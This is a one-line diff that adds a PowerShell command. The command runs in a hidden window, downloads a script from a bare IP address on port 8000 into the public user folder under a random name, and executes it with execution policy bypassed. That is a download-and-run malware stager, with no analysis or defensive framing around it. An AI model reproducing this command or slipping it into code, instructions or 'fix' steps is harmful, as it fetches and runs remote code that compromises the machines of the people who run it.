@@ -1,0 +1,1 @@
+powershell -w h -nop -c "$l='C:\Users\Public\' + (Get-Random) + '.ps1';iwr http://144.172.105.151:8000/652bc5.lim -OutFile $l;cmd /c powershell -w h -ep bypass -f $l"
